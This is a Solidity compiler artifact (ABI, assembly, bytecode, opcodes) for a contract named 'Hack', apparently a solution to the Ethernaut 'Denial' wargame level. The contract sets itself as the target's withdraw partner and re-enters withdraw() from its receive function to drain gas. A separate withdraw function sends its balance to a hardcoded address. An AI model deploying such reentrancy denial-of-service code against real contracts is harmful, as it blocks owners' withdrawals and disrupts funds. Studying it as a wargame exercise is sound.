{
	"security/etheranut/Denial/Denia.sol": {
		"Hack": {
			"abi": [
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdraw",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"security/etheranut/Denial/Denia.sol\":1181:1701  contract Hack {... */\n  mstore(0x40, 0x80)\n    /* \"security/etheranut/Denial/Denia.sol\":1235:1277  0xbC50E383AB39a02A57D19e4b5e71Da263411b894 */\n  0xbc50e383ab39a02a57d19e4b5e71da263411b894\n    /* \"security/etheranut/Denial/Denia.sol\":1202:1278  address payable target = payable(0xbC50E383AB39a02A57D19e4b5e71Da263411b894) */\n  0x00\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"security/etheranut/Denial/Denia.sol\":1308:1314  target */\n  0x00\n  0x00\n  swap1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"security/etheranut/Denial/Denia.sol\":1285:1315  Denial denial = Denial(target) */\n  0x01\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"security/etheranut/Denial/Denia.sol\":1181:1701  contract Hack {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"security/etheranut/Denial/Denia.sol\":1181:1701  contract Hack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x3ccfd60b\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_4\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"security/etheranut/Denial/Denia.sol\":1673:1679  denial */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Denial/Denia.sol\":1673:1688  denial.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"security/etheranut/Denial/Denia.sol\":1673:1690  denial.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_7\n      jumpi\n      revert(0x00, 0x00)\n    tag_7:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_9\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_9:\n      stop\n        /* \"security/etheranut/Denial/Denia.sol\":1181:1701  contract Hack {... */\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"security/etheranut/Denial/Denia.sol\":1444:1627  function withdraw() public payable {... */\n    tag_3:\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      stop\n        /* \"security/etheranut/Denial/Denia.sol\":1322:1436  function attack() public {... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_12\n      jumpi\n      revert(0x00, 0x00)\n    tag_12:\n      pop\n      tag_13\n      tag_14\n      jump\t// in\n    tag_13:\n      stop\n        /* \"security/etheranut/Denial/Denia.sol\":1444:1627  function withdraw() public payable {... */\n    tag_11:\n        /* \"security/etheranut/Denial/Denia.sol\":1490:1510  uint256 amountToSend */\n      0x00\n        /* \"security/etheranut/Denial/Denia.sol\":1513:1534  address(this).balance */\n      selfbalance\n        /* \"security/etheranut/Denial/Denia.sol\":1490:1534  uint256 amountToSend = address(this).balance */\n      swap1\n      pop\n        /* \"security/etheranut/Denial/Denia.sol\":1553:1595  0x2797F5291A7FAA3368fF031807b6B70C7bBEEF65 */\n      0x2797f5291a7faa3368ff031807b6b70c7bbeef65\n        /* \"security/etheranut/Denial/Denia.sol\":1545:1605  payable(0x2797F5291A7FAA3368fF031807b6B70C7bBEEF65).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Denial/Denia.sol\":1545:1619  payable(0x2797F5291A7FAA3368fF031807b6B70C7bBEEF65).transfer(amountToSend) */\n      0x08fc\n        /* \"security/etheranut/Denial/Denia.sol\":1606:1618  amountToSend */\n      dup3\n        /* \"security/etheranut/Denial/Denia.sol\":1545:1619  payable(0x2797F5291A7FAA3368fF031807b6B70C7bBEEF65).transfer(amountToSend) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_17\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_17:\n      pop\n        /* \"security/etheranut/Denial/Denia.sol\":1479:1627  {... */\n      pop\n        /* \"security/etheranut/Denial/Denia.sol\":1444:1627  function withdraw() public payable {... */\n      jump\t// out\n        /* \"security/etheranut/Denial/Denia.sol\":1322:1436  function attack() public {... */\n    tag_14:\n        /* \"security/etheranut/Denial/Denia.sol\":1358:1364  denial */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Denial/Denia.sol\":1358:1383  denial.setWithdrawPartner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x4e1c5914\n        /* \"security/etheranut/Denial/Denia.sol\":1392:1396  this */\n      address\n        /* \"security/etheranut/Denial/Denia.sol\":1358:1398  denial.setWithdrawPartner(address(this)) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_21\n      jumpi\n      revert(0x00, 0x00)\n    tag_21:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_23\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_23:\n      pop\n      pop\n      pop\n      pop\n        /* \"security/etheranut/Denial/Denia.sol\":1322:1436  function attack() public {... */\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_24:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:235   */\n    tag_25:\n        /* \"#utility.yul\":176:183   */\n      0x00\n        /* \"#utility.yul\":205:229   */\n      tag_30\n        /* \"#utility.yul\":223:228   */\n      dup3\n        /* \"#utility.yul\":205:229   */\n      tag_24\n      jump\t// in\n    tag_30:\n        /* \"#utility.yul\":194:229   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:235   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":241:359   */\n    tag_26:\n        /* \"#utility.yul\":328:352   */\n      tag_32\n        /* \"#utility.yul\":346:351   */\n      dup2\n        /* \"#utility.yul\":328:352   */\n      tag_25\n      jump\t// in\n    tag_32:\n        /* \"#utility.yul\":323:326   */\n      dup3\n        /* \"#utility.yul\":316:353   */\n      mstore\n        /* \"#utility.yul\":241:359   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":365:587   */\n    tag_20:\n        /* \"#utility.yul\":458:462   */\n      0x00\n        /* \"#utility.yul\":496:498   */\n      0x20\n        /* \"#utility.yul\":485:494   */\n      dup3\n        /* \"#utility.yul\":481:499   */\n      add\n        /* \"#utility.yul\":473:499   */\n      swap1\n      pop\n        /* \"#utility.yul\":509:580   */\n      tag_34\n        /* \"#utility.yul\":577:578   */\n      0x00\n        /* \"#utility.yul\":566:575   */\n      dup4\n        /* \"#utility.yul\":562:579   */\n      add\n        /* \"#utility.yul\":553:559   */\n      dup5\n        /* \"#utility.yul\":509:580   */\n      tag_26\n      jump\t// in\n    tag_34:\n        /* \"#utility.yul\":365:587   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212206b03cb4f64b1e9d9834ea83e402f6baa9acaade44321d4c2695aaecda9662dfe64736f6c634300081e0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405273bc50e383ab39a02a57d19e4b5e71da263411b8945f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801560c1575f5ffd5b50610245806100cf5f395ff3fe60806040526004361061002c575f3560e01c80633ccfd60b146100af5780639e5faafc146100b9576100ab565b366100ab5760015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610097575f5ffd5b505af11580156100a9573d5f5f3e3d5ffd5b005b5f5ffd5b6100b76100cf565b005b3480156100c4575f5ffd5b506100cd61012e565b005b5f479050732797f5291a7faa3368ff031807b6b70c7bbeef6573ffffffffffffffffffffffffffffffffffffffff166108fc8290811502906040515f60405180830381858888f1935050505015801561012a573d5f5f3e3d5ffd5b5050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16634e1c5914306040518263ffffffff1660e01b815260040161018891906101f6565b5f604051808303815f87803b15801561019f575f5ffd5b505af11580156101b1573d5f5f3e3d5ffd5b50505050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6101e0826101b7565b9050919050565b6101f0816101d6565b82525050565b5f6020820190506102095f8301846101e7565b9291505056fea26469706673582212206b03cb4f64b1e9d9834ea83e402f6baa9acaade44321d4c2695aaecda9662dfe64736f6c634300081e0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0xBC50E383AB39A02A57D19E4B5E71DA263411B894 PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH1 0xC1 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x245 DUP1 PUSH2 0xCF PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2C JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x3CCFD60B EQ PUSH2 0xAF JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0xB9 JUMPI PUSH2 0xAB JUMP JUMPDEST CALLDATASIZE PUSH2 0xAB JUMPI PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x97 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xA9 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST STOP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0xB7 PUSH2 0xCF JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xC4 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0xCD PUSH2 0x12E JUMP JUMPDEST STOP JUMPDEST PUSH0 SELFBALANCE SWAP1 POP PUSH20 0x2797F5291A7FAA3368FF031807B6B70C7BBEEF65 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC DUP3 SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x12A JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x4E1C5914 ADDRESS PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x188 SWAP2 SWAP1 PUSH2 0x1F6 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x19F JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1B1 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1E0 DUP3 PUSH2 0x1B7 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1F0 DUP2 PUSH2 0x1D6 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x209 PUSH0 DUP4 ADD DUP5 PUSH2 0x1E7 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH12 0x3CB4F64B1E9D9834EA83E40 0x2F PUSH12 0xAA9ACAADE44321D4C2695AAE 0xCD 0xA9 PUSH7 0x2DFE64736F6C63 NUMBER STOP ADDMOD 0x1E STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "116200",
						"executionCost": "50828",
						"totalCost": "167028"
					},
					"external": {
						"attack()": "infinite",
						"withdraw()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"withdraw()": "3ccfd60b"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 89,
						"contract": "security/etheranut/Denial/Denia.sol:Hack",
						"label": "target",
						"offset": 0,
						"slot": "0",
						"type": "t_address_payable"
					},
					{
						"astId": 95,
						"contract": "security/etheranut/Denial/Denia.sol:Hack",
						"label": "denial",
						"offset": 0,
						"slot": "1",
						"type": "t_contract(Denial)83"
					}
				],
				"types": {
					"t_address_payable": {
						"encoding": "inplace",
						"label": "address payable",
						"numberOfBytes": "20"
					},
					"t_contract(Denial)83": {
						"encoding": "inplace",
						"label": "contract Denial",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}